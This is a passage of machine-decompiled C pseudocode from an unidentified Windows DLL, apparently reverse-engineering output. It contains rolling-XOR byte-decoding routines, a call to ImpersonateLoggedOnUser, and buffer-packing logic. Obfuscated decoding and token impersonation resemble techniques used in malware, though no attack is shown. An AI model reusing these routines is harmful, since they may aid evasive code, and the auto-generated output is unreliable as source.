        *(_DWORD *)(*(_DWORD *)(a2 + 92) + 36),
        *(_BYTE *)(*(_DWORD *)(a2 + 92) + 40),
        *(_DWORD *)(*(_DWORD *)(a2 + 92) + 41));
      *(_BYTE *)(a2 - 4) = 8;
      v17 = (void *)(a2 + 32);
      sub_1002040F((void *)(a2 - 52));
      v16 = v10;
      v15 = v10;
      *(_DWORD *)(a2 + 52) = &v15;
      sub_1000D372(&v15, a2 + 60);
      *(_BYTE *)(a2 - 4) = 9;
      *(_BYTE *)(a2 - 4) = 8;
      sub_1001AAB4((void *)(a2 - 52), v15, v16);
      *(_BYTE *)(a2 - 4) = 6;
      sub_1000B3DF((int *)(a2 + 32));
    }
    *(_BYTE *)(a2 - 4) = 5;
    sub_1002F123((int *)(a2 - 120));
    if ( *(int *)(a2 + 104) <= 0 )
      break;
    v3 = *(_DWORD *)(a2 + 92);
    v4 = *(_DWORD **)(a2 + 56);
  }
  if ( *(_DWORD *)(a2 - 56) )
  {
    v3 = *(_DWORD *)(a2 + 92);
LABEL_19:
    v13 = sub_1001AD84((_DWORD *)(a2 - 88), a2 + 12);
    *(_BYTE *)(a2 - 4) = 15;
    v14 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 12))(v3, v13);
    *(_BYTE *)(a2 - 4) = 5;
    sub_1000B3DF((int *)(a2 + 12));
    *(_BYTE *)(a2 - 4) = 4;
    sub_1001A9CE(a2 - 52);
    *(_BYTE *)(a2 - 4) = 3;
    sub_1001AC89(a2 - 88);
    *(_DWORD *)(a2 - 4) = 17;
    *(_BYTE *)(a2 - 4) = 16;
    sub_1000B3DF((int *)(a2 + 72));
    *(_DWORD *)(a2 - 4) = -1;
    sub_1000D3AD((int *)(a2 + 60));
    return v14;
  }
  if ( *(_DWORD *)(a2 + 104) == -2 )
  {
    sub_10029BB6(a2 + 107, a2 + 107);
    v16 = v11;
    v15 = v11;
    *(_DWORD *)(a2 + 104) = &v15;
    sub_1000728E(&v15, 0);
    *(_BYTE *)(a2 - 4) = 10;
    *(_BYTE *)(a2 - 4) = 5;
    sub_1004F292((_DWORD *)dword_10182DE8, 114, a2 + 60, v15, v16);
  }
  *(_BYTE *)(a2 - 4) = 4;
  sub_1001A9CE(a2 - 52);
  *(_BYTE *)(a2 - 4) = 3;
  sub_1001AC89(a2 - 88);
  *(_DWORD *)(a2 - 4) = 12;
  *(_BYTE *)(a2 - 4) = 11;
  sub_1000B3DF((int *)(a2 + 72));
  *(_DWORD *)(a2 - 4) = -1;
  sub_1000D3AD((int *)(a2 + 60));
  return 0;
}
// 1002F349: variable 'v5' is possibly undefined
// 1002F426: variable 'v10' is possibly undefined
// 1002F47E: variable 'v11' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1002F5E0) --------------------------------------------------------
void __stdcall sub_1002F5E0(int *a1)
{
  sub_1000B3DF(a1 + 3);
  sub_1000D3AD(a1);
}

//----- (1002F60E) --------------------------------------------------------
char sub_1002F60E()
{
  return 28;
}

//----- (1002F611) --------------------------------------------------------
void *__thiscall sub_1002F611(_DWORD *this, int a2, void *a3, _DWORD **a4, int a5)
{
  _DWORD *v6; // eax
  _DWORD *v7; // ebx
  _DWORD *i; // edi
  int *v9; // eax
  _DWORD *v10; // eax
  int v11; // esi
  int *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  int v15; // esi
  _DWORD *v16; // eax
  volatile LONG *v17; // ecx
  int *v18; // eax
  _DWORD *v19; // eax
  unsigned int v21; // [esp-24h] [ebp-E4h]
  volatile LONG *v22[5]; // [esp-1Ch] [ebp-DCh] BYREF
  volatile LONG *v23; // [esp-8h] [ebp-C8h] BYREF
  volatile LONG *v24; // [esp-4h] [ebp-C4h]
  int v25[16]; // [esp+10h] [ebp-B0h] BYREF
  int v26[5]; // [esp+50h] [ebp-70h] BYREF
  int v27[2]; // [esp+64h] [ebp-5Ch] BYREF
  int v28; // [esp+6Ch] [ebp-54h] BYREF
  _DWORD *v29; // [esp+70h] [ebp-50h]
  _DWORD *v30; // [esp+74h] [ebp-4Ch]
  int v31; // [esp+7Ch] [ebp-44h]
  _DWORD **v32; // [esp+80h] [ebp-40h]
  int v33; // [esp+84h] [ebp-3Ch]
  volatile LONG *v34; // [esp+88h] [ebp-38h] BYREF
  void *Block; // [esp+8Ch] [ebp-34h]
  int v36[4]; // [esp+90h] [ebp-30h] BYREF
  int v37; // [esp+A0h] [ebp-20h] BYREF
  void *v38; // [esp+A4h] [ebp-1Ch] BYREF
  int v39; // [esp+A8h] [ebp-18h]
  void *v40; // [esp+ACh] [ebp-14h]
  int v41; // [esp+BCh] [ebp-4h]
  int v42[153]; // [esp+C0h] [ebp+0h] BYREF
  LONG v43[4]; // [esp+324h] [ebp+264h] BYREF

  v31 = a2;
  v40 = a3;
  v29 = this;
  v32 = a4;
  v33 = a5;
  v39 = 0;
  v41 = 2;
  Block = operator new(0x28u);
  if ( Block )
  {
    v23 = v24;
    v38 = &v23;
    sub_1000B964(&v23);
    LOBYTE(v41) = 2;
    v6 = sub_1000BA6E(-1, 0x80000000, Block, (int)(this + 150), 128, -1, (int)v23, v24);
  }
  else
  {
    v6 = 0;
  }
  LOBYTE(v41) = 1;
  sub_10050B91(&v34, (int)v6);
  LOBYTE(v41) = 4;
  v38 = &v23;
  v24 = (volatile LONG *)Block;
  v23 = v34;
  InterlockedIncrement((volatile LONG *)Block);
  LOBYTE(v41) = 4;
  sub_100250DF(v25, (int)v23, v24);
  LOBYTE(v41) = 6;
  sub_1002F9C2(v42, v29);
  LOBYTE(v41) = 7;
  sub_100254EB((int)v25, v36);
  LOBYTE(v41) = 8;
  v7 = v32;
  for ( i = *v32; ; i = (_DWORD *)((char *)i + 1) )
  {
    v30 = i;
    if ( (unsigned int)i >= v36[3] )
      break;
    v9 = (int *)(*(int (__thiscall **)(int *, _DWORD *))(v36[0] + 44))(v36, i);
    v10 = sub_10020765(*v9, &v37);
    LOBYTE(v41) = 9;
    v11 = sub_1000DEE8((int)v10, 0x2Eu);
    LOBYTE(v41) = 8;
    sub_1000D3AD(&v37);
    if ( v11 != -1 )
    {
      v42[8] = *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v36[0] + 44))(v36, i) + 28);
      v42[7] = 0;
      v12 = (int *)(*(int (__thiscall **)(int *, _DWORD *))(v36[0] + 44))(v36, i);
      v13 = sub_10020765(*v12, v27);
      LOBYTE(v41) = 10;
      v14 = sub_1000D836(-2, (int)v13, &v28, v11);
      LOBYTE(v41) = 11;
      sub_10001236(v14 + 1, v43);
      LOBYTE(v41) = 10;
      sub_1000D3AD(&v28);
      LOBYTE(v41) = 8;
      sub_1000D3AD(v27);
      v15 = v31;
      (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(v31 + 52) + 8))(*(_DWORD *)(v31 + 52));
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v15 + 52) + 4))(*(_DWORD *)(v15 + 52), v42) )
      {
        v16 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v36[0] + 44))(v36, i);
        v22[1] = v17;
        v22[0] = v17;
        v38 = v22;
        sub_10011AE0(v16, v22);
        LOBYTE(v41) = 12;
        v21 = *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int *))(v36[0] + 44))(v36) + 28);
        LOBYTE(v41) = 8;
        sub_10025748((int)v25, v26, v21, i, v22[0]);
        LOBYTE(v41) = 13;
        v18 = (int *)(*(int (__thiscall **)(int *, _DWORD *))(v36[0] + 44))(v36, i);
        v19 = sub_10020765(*v18, v27);
        LOBYTE(v41) = 14;
        sub_10001236(v19 + 1, (LONG *)(v33 + 4));
        LOBYTE(v41) = 13;
        sub_1000D3AD(v27);
        *v7 = (char *)i + 1;
        sub_1000B36F(v26, (int)v40);
        v39 |= 1u;
        LOBYTE(v41) = 8;
        sub_1000B3DF(v26);
        LOBYTE(v41) = 7;
        sub_10023DCC(v36);
        LOBYTE(v41) = 6;
        sub_10008B27(v42);
        LOBYTE(v41) = 4;
        sub_10023D4C(v25);
        LOBYTE(v41) = 1;
        sub_10020B81(&v34);
        return v40;
      }
    }
  }
  *v7 = -1;
  LOBYTE(v41) = 7;
  sub_10023DCC(v36);
  LOBYTE(v41) = 6;
  sub_10008B27(v42);
  LOBYTE(v41) = 4;
  sub_10023D4C(v25);
  LOBYTE(v41) = 1;
  sub_10020B81(&v34);
  v41 = 0;
  sub_1000D17D(&v37, &word_10178468);
  v41 = 18;
  sub_10001236((LONG *)&v38, (LONG *)(v33 + 4));
  LOBYTE(v41) = 0;
  sub_1000D3AD(&v37);
  sub_1000B1F3(0, (int)v40, 0);
  v41 = 0;
  v39 |= 1u;
  return v40;
}
// 1002F7FC: variable 'v17' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1002F611: using guessed type LONG var_14[4];

//----- (1002F9C2) --------------------------------------------------------
_DWORD *__stdcall sub_1002F9C2(_DWORD *a1, _DWORD *a2)
{
  volatile LONG *v2; // edx

  qmemcpy(a1, a2, 0x250u);
  sub_1000D372(a1 + 148, (int)(a2 + 148));
  sub_1000D372(a1 + 150, (int)(a2 + 150));
  sub_1000D372(a1 + 152, (int)(a2 + 152));
  a1[154] = a2[154];
  v2 = (volatile LONG *)a2[156];
  a1[156] = v2;
  a1[155] = a2[155];
  InterlockedIncrement(v2);
  return a1;
}

//----- (1002FA5D) --------------------------------------------------------
void *__cdecl sub_1002FA5D(void *a1, int a2, int a3, int a4, void *a5)
{
  int v5; // ecx
  unsigned int v6; // esi
  char v7; // bl
  int v8; // ecx
  char v10; // [esp+17h] [ebp-Dh]

  sub_1000B1F3(a5, (int)a1, 0);
  v6 = 0;
  v10 = 72;
  if ( a5 )
  {
    do
    {
      v7 = v10 ^ *(_BYTE *)sub_1000B4CB((int)&a2, v5, v6);
      *(_BYTE *)sub_1000B4CB((int)a1, v8, v6) = v7;
      if ( v6 )
        v10 ^= *(_BYTE *)sub_1000B4CB((int)&a2, v5, v6 - 1);
      ++v6;
    }
    while ( v6 < (unsigned int)a5 );
  }
  sub_1000B3DF(&a2);
  return a1;
}
// 1002FA95: variable 'v5' is possibly undefined
// 1002FAA3: variable 'v8' is possibly undefined

//----- (1002FADA) --------------------------------------------------------
int __cdecl sub_1002FADA(int a1, int a2, int a3, int a4, void *a5)
{
  int v5; // ecx
  unsigned int v6; // esi
  char v7; // bl
  int v8; // ecx
  char v10; // [esp+17h] [ebp-Dh]

  sub_1000B1F3(a5, a1, 0);
  v6 = 0;
  v10 = 72;
  if ( a5 )
  {
    do
    {
      v7 = v10 ^ *(_BYTE *)sub_1000B4CB((int)&a2, v5, v6);
      *(_BYTE *)sub_1000B4CB(a1, v8, v6) = v7;
      if ( v6 )
        v10 ^= *(_BYTE *)sub_1000B4CB(a1, v5, v6 - 1);
      ++v6;
    }
    while ( v6 < (unsigned int)a5 );
  }
  sub_1000B3DF(&a2);
  return a1;
}
// 1002FB13: variable 'v5' is possibly undefined
// 1002FB20: variable 'v8' is possibly undefined

//----- (1002FB55) --------------------------------------------------------
char __cdecl sub_1002FB55(_DWORD *a1)
{
  char v1; // bl
  int v2; // eax
  _DWORD *v3; // esi
  int v4; // eax
  void *v5; // eax
  int v6; // eax
  int v8[5]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_1001B801(v8);
  v1 = 0;
  v9 = 0;
  if ( v8[1] )
  {
    v2 = (*(int (__thiscall **)(int *, _DWORD))(v8[0] + 44))(v8, 0);
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2) != -1 )
    {
      v3 = operator new(4u);
      LOBYTE(v9) = 1;
      if ( v3 )
      {
        v4 = (*(int (__thiscall **)(int *, _DWORD))(v8[0] + 44))(v8, 0);
        *v3 = off_10102F94;
        v5 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
        if ( !ImpersonateLoggedOnUser(v5) )
          sub_100227A3(v3);
        v6 = (int)v3;
      }
      else
      {
        v6 = 0;
      }
      LOBYTE(v9) = 0;
      sub_1001F430(a1, v6);
      v1 = 1;
    }
  }
  v9 = -1;
  sub_1001C0A7(v8);
  return v1;
}
// 100227A3: using guessed type void __stdcall __noreturn sub_100227A3(_DWORD);
// 10102F94: using guessed type int (__thiscall *off_10102F94[3])(void *Block, char);

//----- (1002FC2C) --------------------------------------------------------
bool __cdecl sub_1002FC2C(SYSTEMTIME SystemTime, SYSTEMTIME a2)
{
  struct _FILETIME FileTime; // [esp+8h] [ebp-10h] BYREF
  struct _FILETIME v4; // [esp+10h] [ebp-8h] BYREF

  FileTime.dwLowDateTime = 0;
  v4.dwLowDateTime = 0;
  FileTime.dwHighDateTime = 0;
  v4.dwHighDateTime = 0;
  return SystemTimeToFileTime(&SystemTime, &FileTime)
      && SystemTimeToFileTime(&a2, &v4)
      && *(_QWORD *)&FileTime >= *(unsigned __int64 *)&v4;
}

//----- (1002FC83) --------------------------------------------------------
char __usercall sub_1002FC83@<al>(int a1@<esi>, int a2)
{
  int v2; // edi
  int v3; // eax
  bool v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = 0;
  if ( !(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
    return 0;
  while ( 1 )
  {
    sub_1000D17D(v6, *(wchar_t **)(*(_DWORD *)(a2 + 4) + 12));
    v7 = 0;
    v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 48))(a1, v2);
    v4 = sub_1000DE70((int)v6, v3);
    v7 = -1;
    sub_1000D3AD(v6);
    if ( v4 )
      break;
    if ( ++v2 >= (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
      return 0;
  }
  return 1;
}

//----- (1002FCEE) --------------------------------------------------------
PCNZWCH __usercall sub_1002FCEE@<eax>(wint_t *a1@<esi>, PCNZWCH lpString1, unsigned int a3, unsigned int cchCount1)
{
  const WCHAR *v4; // edi
  wint_t v6; // bx
  wint_t v7; // [esp+8h] [ebp-8h]
  unsigned int v8; // [esp+Ch] [ebp-4h]

  v4 = lpString1;
  v8 = 0;
  if ( lpString1 && a1 && a3 )
  {
    if ( !cchCount1 )
      return lpString1;
    v7 = towlower(*a1);
    v6 = towupper(*a1);
    while ( a3 - v8 >= cchCount1 )
    {
      if ( (*v4 == v6 || *v4 == v7) && CompareStringW(0x400u, 1u, v4, cchCount1, a1, cchCount1) == 2 )
        return &lpString1[v8];
      ++v8;
      ++v4;
      if ( v8 > a3 )
        return 0;
    }
  }
  return 0;
}

//----- (1002FD81) --------------------------------------------------------
_DWORD *__userpurge sub_1002FD81@<eax>(unsigned int a1@<esi>, _DWORD *a2)
{
  _DWORD *result; // eax
  int v3; // ecx
  _DWORD *v4; // eax

  result = a2;
  v3 = 10485760;
  *a2 = &off_10103440;
  if ( a1 - 5 < 0xA00000 )
    v3 = a1 - 5;
  result[1] = v3;
  if ( a1 <= 5 )
  {
    v4 = sub_1000E7F7(&a2, 1, 0);
    sub_10007882((int)v4);
  }
  return result;
}
// 10103440: using guessed type int (__thiscall *off_10103440)(void *Block, char);

//----- (1002FDF0) --------------------------------------------------------
void __fastcall sub_1002FDF0(_DWORD *a1, int a2)
{
  LONG *v4; // eax
  int v5; // ecx
  void *v6; // eax
  int v7; // ecx
  int v8; // eax
  const void *v9; // [esp-8h] [ebp-54h]
  size_t v10; // [esp-4h] [ebp-50h]
  int v11[5]; // [esp+10h] [ebp-3Ch] BYREF
  int v12[3]; // [esp+24h] [ebp-28h] BYREF
  int v13; // [esp+30h] [ebp-1Ch]
  char Src[5]; // [esp+38h] [ebp-14h] BYREF
  int v15; // [esp+48h] [ebp-4h]

  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 16))(a2, v12);
  v15 = 0;
  Src[0] = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  *(_DWORD *)&Src[1] = v13;
  v4 = (LONG *)sub_1000B1F3((void *)(v13 + 5), (int)v11, 0);
  LOBYTE(v15) = 1;
  sub_1000B3BD(v4, (int)a1);
  LOBYTE(v15) = 0;
  sub_1000B3DF(v11);
  v6 = (void *)sub_1000B49B(a1, v5);
  memcpy(v6, Src, 5u);
  v10 = *(_DWORD *)&Src[1];
  v9 = (const void *)sub_1000B4B8(v12);
  v8 = sub_1000B49B(a1, v7);
  memcpy((void *)(v8 + 5), v9, v10);
  *(_BYTE *)(a1[1] + 8) = 1;
  v15 = -1;
  sub_1000B3DF(v12);
}
// 1002FE4C: variable 'v5' is possibly undefined
// 1002FE68: variable 'v7' is possibly undefined
// 1002FDF0: using guessed type int var_28[3];
// 1002FDF0: using guessed type int var_3C[5];

//----- (1002FE92) --------------------------------------------------------
char sub_1002FE92()
{
  return 19;
}

//----- (1002FE95) --------------------------------------------------------
int __fastcall sub_1002FE95(unsigned int a1, int a2, int a3)
{
  int v4; // eax
  void *v5; // eax
  int v6; // eax

  sub_1002FD81(a1, (_DWORD *)a3);
  *(_DWORD *)a3 = &off_10103454;
  *(_BYTE *)(a3 + 8) = 0;
  sub_1002E147((_DWORD *)(a3 + 12));
  v4 = 10485760;
  *(_DWORD *)(a3 + 48) = 0;
  if ( a1 < 0xA00000 )
    v4 = a1;
  *(_DWORD *)(a3 + 52) = v4;
  v5 = operator new(0x24u);
  if ( v5 )
    v6 = sub_1001AC1E((int)v5);
  else
    v6 = 0;
  sub_1000728E((_DWORD *)(a3 + 56), v6);
  sub_1000B1F3((void *)(*(_DWORD *)(a3 + 52) + 1000), a3 + 64, 0);
  sub_1000B1F3(0, a3 + 84, 0);
  sub_1001EC12(a3 + 108);
  return a3;
}
// 10103454: using guessed type int (__thiscall *off_10103454)(void *Block, char);

//----- (1002FF45) --------------------------------------------------------
int *__thiscall sub_1002FF45(int *Block, char a2)
{
  sub_1002FF61(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002FF61) --------------------------------------------------------
void __thiscall sub_1002FF61(int *this)
{
  *this = (int)&off_10103454;
  sub_1001ECA1(this + 27);
  sub_1000B3DF(this + 21);
  sub_1000B3DF(this + 16);
  sub_1000780D(this + 14);
  sub_1002E18F(this + 3);
  *this = (int)&off_10103440;
}
// 10103440: using guessed type int (__thiscall *off_10103440)(void *Block, char);
// 10103454: using guessed type int (__thiscall *off_10103454)(void *Block, char);

//----- (1002FFC7) --------------------------------------------------------
void *__thiscall sub_1002FFC7(int *this, void *a2)
{
  void *v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // edi
  LONG *v7; // eax
  int v9[5]; // [esp+10h] [ebp-38h] BYREF
  _DWORD *v10[2]; // [esp+24h] [ebp-24h] BYREF
  void *v11[3]; // [esp+2Ch] [ebp-1Ch] BYREF
  int v12; // [esp+38h] [ebp-10h]
  int v13; // [esp+44h] [ebp-4h]

  v13 = 0;
  v12 = 0;
  sub_1000EDE4(this + 27, v10);
  v13 = 1;
  if ( !*((_BYTE *)this + 8) )
    sub_100302DC((int)this);
  (*(void (__thiscall **)(int, void *))(*(_DWORD *)this[14] + 36))(this[14], a2);
  v12 = 1;
  v3 = operator new(0x24u);
  v11[2] = v3;
  LOBYTE(v13) = 2;
  if ( v3 )
    v4 = sub_1001AC1E((int)v3);
  else
    v4 = 0;
  LOBYTE(v13) = 1;
  v5 = sub_1000728E(v11, v4);
  LOBYTE(v13) = 3;
  sub_1003098B(this + 14, v5);
  LOBYTE(v13) = 1;
  sub_1000780D(v11);
  v6 = this[24];
  *((_BYTE *)this + 8) = 0;
  if ( v6 )
  {
    (*(void (__thiscall **)(int *, int *, _DWORD))(*this + 4))(this, this + 21, *((unsigned __int8 *)this + 104));
    if ( this[24] == v6 )
    {
      v7 = (LONG *)sub_1000B1F3(0, (int)v9, 0);
      LOBYTE(v13) = 4;
      sub_1000B3BD(v7, (int)(this + 21));
      LOBYTE(v13) = 1;
      sub_1000B3DF(v9);
    }
  }
  LOBYTE(v13) = 0;
  sub_1000EDA4(v10);
  return a2;
}
// 1002FFC7: using guessed type int var_38[5];

//----- (100300A6) --------------------------------------------------------
int __thiscall sub_100300A6(int *this, _DWORD *a2, int a3)
{
  int v3; // esi
  int v4; // esi
  unsigned int v6; // edi
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int i; // ecx
  int v11; // edi
  int v12; // eax
  int v13; // edi
  void *v14; // eax
  int v15; // eax
  LONG *v16; // eax
  _DWORD *v17; // esi
  _DWORD *v18; // eax
  int v19; // edi
  int v20; // eax
  int v21; // [esp+18h] [ebp-44h]
  int v23; // [esp+20h] [ebp-3Ch]
  _DWORD *v24[2]; // [esp+28h] [ebp-34h] BYREF
  _DWORD v25[2]; // [esp+30h] [ebp-2Ch] BYREF
  int v26[6]; // [esp+38h] [ebp-24h] BYREF
  int v27; // [esp+58h] [ebp-4h]

  v3 = (int)this;
  v21 = 0;
  sub_1000EDE4(this + 27, v24);
  v27 = 0;
  if ( *(_BYTE *)(v3 + 8) )
  {
    v4 = 1;
  }
  else
  {
    v6 = a2[3];
    if ( v6 <= (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 12))(v3) )
    {
      if ( *(_DWORD *)(v3 + 52) < *(_DWORD *)(v3 + 48) && (v9 = sub_100302DC(v3)) != 0 )
      {
        v4 = v9;
      }
      else
      {
        for ( i = *(_DWORD *)(v3 + 48); *(_DWORD *)(v3 + 52) < (unsigned int)(a2[3] + i); i = *(_DWORD *)(v3 + 48) - v21 )
        {
          v11 = *(_DWORD *)(v3 + 52) - *(_DWORD *)(v3 + 48);
          v12 = sub_1000B67C(a2, (int)v26, v21, v11);
          LOBYTE(v27) = 2;
          (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 4))(v3, v12, a3);
          LOBYTE(v27) = 0;
          sub_1000B3DF(v26);
          v21 += v11;
          if ( sub_100302DC(v3) )
          {
            v16 = (LONG *)sub_1000B67C(a2, (int)v26, v21, a2[3] - v21);
            LOBYTE(v27) = 3;
            sub_1000B3BD(v16, v3 + 84);
            LOBYTE(v27) = 0;
            sub_1000B3DF(v26);
            this[26] = (unsigned __int8)a3;
            goto LABEL_17;
          }
        }
        v13 = v3 + 12;
        v23 = v3 + 12;
        if ( !(*(unsigned __int8 (__thiscall **)(int, int *))(*(_DWORD *)(v3 + 12) + 8))(v3 + 12, &a3) )
        {
          v14 = operator new(0x24u);
          LOBYTE(v27) = 4;
          if ( v14 )
            v15 = sub_1001AC1E((int)v14);
          else
            v15 = 0;
          LOBYTE(v27) = 0;
          v17 = sub_1000728E(v25, v15);
          LOBYTE(v27) = 5;
          v18 = (_DWORD *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)v13 + 16))(v13, &a3);
          sub_1003098B(v18, v17);
          LOBYTE(v27) = 0;
          sub_1000780D(v25);
          v3 = (int)this;
          v13 = v23;
        }
        v19 = *(_DWORD *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)v13 + 16))(v13, &a3);
        v20 = sub_1000B67C(a2, (int)v26, v21, a2[3] - v21);
        LOBYTE(v27) = 6;
        (*(void (__thiscall **)(int, int))(*(_DWORD *)v19 + 12))(v19, v20);
        LOBYTE(v27) = 0;
        sub_1000B3DF(v26);
        *(_DWORD *)(v3 + 48) += a2[3] - v21;
LABEL_17:
        v4 = 0;
      }
    }
    else
    {
      v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 12))(v3);
      v8 = sub_1000B67C(a2, (int)v26, 0, v7);
      LOBYTE(v27) = 1;
      v4 = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 4))(v3, v8, a3);
      LOBYTE(v27) = 0;
      sub_1000B3DF(v26);
    }
  }
  v27 = -1;
  sub_1000EDA4(v24);
  return v4;
}
// 100300A6: using guessed type int var_24[6];
// 100300A6: using guessed type _DWORD var_2C[2];

//----- (100302DC) --------------------------------------------------------
int __stdcall sub_100302DC(int a1)
{
  int v1; // edi
  unsigned int v3; // ebx
  int v4; // ecx
  _DWORD *v5; // eax
  int v6; // edi
  int v7; // ecx
  int v8; // eax
  _DWORD *v9; // eax
  int v10; // ecx
  int v11; // eax
  unsigned int v12; // esi
  bool v13; // al
  int v14; // esi
  int v15; // eax
  const void *v16; // [esp-8h] [ebp-7Ch]
  size_t v17; // [esp-4h] [ebp-78h]
  int v18; // [esp+14h] [ebp-60h]
  int v19; // [esp+14h] [ebp-60h]
  int v20; // [esp+18h] [ebp-5Ch]
  char Src[8]; // [esp+1Ch] [ebp-58h] BYREF
  int v22[2]; // [esp+24h] [ebp-50h] BYREF
  int v23; // [esp+2Ch] [ebp-48h] BYREF
  unsigned int v24; // [esp+30h] [ebp-44h]
  int v25[5]; // [esp+3Ch] [ebp-38h] BYREF
  int v26[6]; // [esp+50h] [ebp-24h] BYREF
  int v27; // [esp+70h] [ebp-4h]

  v1 = a1;
  if ( !*(_DWORD *)(a1 + 48) )
    return 0;
  v18 = 0;
  v20 = a1 + 12;
  (*(void (__stdcall **)(int *))(*(_DWORD *)(a1 + 12) + 48))(&v23);
  v27 = 0;
  sub_1000B1F3((void *)(*(_DWORD *)(a1 + 48) + 5 * v24), (int)v25, 0);
  LOBYTE(v27) = 1;
  v3 = 0;
  sub_1000728E(v22, 0);
  LOBYTE(v27) = 2;
  if ( v24 )
  {
    do
    {
      Src[0] = *(_BYTE *)(*(int (__thiscall **)(int *, unsigned int))(v23 + 48))(&v23, v3);
      v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v20 + 16))(v20, Src);
      sub_1003098B(v22, v5);
      v6 = v22[0];
      *(_DWORD *)&Src[1] = (*(int (__thiscall **)(int))(*(_DWORD *)v22[0] + 4))(v22[0]);
      v8 = sub_1000B49B(v25, v7);
      memcpy((void *)(v18 + v8), Src, 5u);
      v9 = (_DWORD *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)v6 + 36))(v6, v26);
      LOBYTE(v27) = 3;
      v17 = *(_DWORD *)&Src[1];
      v16 = (const void *)sub_1000B4B8(v9);
      v11 = sub_1000B49B(v25, v10);
      memcpy((void *)(v18 + 5 + v11), v16, v17);
      LOBYTE(v27) = 2;
      sub_1000B3DF(v26);
      ++v3;
      v18 += *(_DWORD *)&Src[1] + 5;
    }
    while ( v3 < v24 );
    v1 = a1;
  }
  *(_BYTE *)(v25[1] + 8) = 1;
  v12 = sub_100405CE(v4, (int)v25, (_DWORD *)(v1 + 64));
  v19 = v12;
  if ( v12 && *(_DWORD *)(v1 + 52) + 1000 >= v12 )
  {
    v13 = *(_BYTE *)(v1 + 8)
       || v12 + (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 56) + 4))(*(_DWORD *)(v1 + 56)) > *(_DWORD *)(v1 + 4);
    *(_BYTE *)(v1 + 8) = v13;
    if ( !v13 )
    {
      v14 = *(_DWORD *)(v1 + 56);
      v15 = sub_1000B6B7((_DWORD *)(v1 + 64), (int)v26, 0, v19);
      LOBYTE(v27) = 4;
      (*(void (__thiscall **)(int, int))(*(_DWORD *)v14 + 12))(v14, v15);
      LOBYTE(v27) = 2;
      sub_1000B3DF(v26);
      (*(void (__thiscall **)(int))(*(_DWORD *)v20 + 28))(v20);
      *(_DWORD *)(v1 + 48) = 0;
      LOBYTE(v27) = 1;
      sub_1000780D(v22);
      LOBYTE(v27) = 0;
      sub_1000B3DF(v25);
      v27 = -1;
      sub_1002DA13((int)&v23);
      return 0;
    }
  }
  LOBYTE(v27) = 1;
  sub_1000780D(v22);
  LOBYTE(v27) = 0;
  sub_1000B3DF(v25);
  v27 = -1;
  sub_1002DA13((int)&v23);
  return 3;
}
// 100303AC: variable 'v7' is possibly undefined
// 100303E4: variable 'v10' is possibly undefined
// 10030428: variable 'v4' is possibly undefined
// 100302DC: using guessed type int var_24[6];

//----- (1003051A) --------------------------------------------------------
char sub_1003051A()
{
  return 3;
}

//----- (1003051D) --------------------------------------------------------
int __stdcall sub_1003051D(int a1, char a2, wchar_t *a3, int a4, volatile LONG *a5, int a6, volatile LONG *lpAddend)
{
  char v7; // al
  _DWORD *v8; // eax
  int v10; // [esp-18h] [ebp-4Ch] BYREF
  volatile LONG *v11; // [esp-14h] [ebp-48h]
  int v12; // [esp-10h] [ebp-44h]
  int v13; // [esp-Ch] [ebp-40h] BYREF
  volatile LONG *v14; // [esp-8h] [ebp-3Ch]
  int v15; // [esp-4h] [ebp-38h]
  int v16[8]; // [esp+10h] [ebp-24h] BYREF
  int v17; // [esp+30h] [ebp-4h]

  v17 = 1;
  v15 = (int)a3;
  a3 = (wchar_t *)&v13;
  v14 = lpAddend;
  v13 = a6;
  InterlockedIncrement(lpAddend);
  LOBYTE(v17) = 2;
  v12 = 0;
  v16[5] = (int)&v10;
  v11 = a5;
  v10 = a4;
  InterlockedIncrement(a5);
  LOBYTE(v17) = 1;
  sub_1002E489((_DWORD *)a1, v10, v11, v12, v13, v14, v15);
  LOBYTE(v17) = 4;
  *(_BYTE *)(a1 + 28) = a2;
  v15 = (int)&word_10178238;
  v14 = (volatile LONG *)(a1 + 36);
  *(_DWORD *)a1 = &off_10103468;
  sub_1000D17D(v14, (wchar_t *)v15);
  LOBYTE(v17) = 5;
  v7 = *(_BYTE *)(a1 + 28);
  *(_DWORD *)(a1 + 32) = 4;
  if ( (v7 & 1) != 0 )
    *(_DWORD *)(a1 + 32) = 8;
  if ( (v7 & 2) != 0 )
    *(_DWORD *)(a1 + 32) += 8;
  if ( (v7 & 4) != 0 )
    *(_DWORD *)(a1 + 32) += 8;
  if ( (v7 & 8) != 0 )
    *(_DWORD *)(a1 + 32) += 8;
  if ( (v7 & 0x10) != 0 )
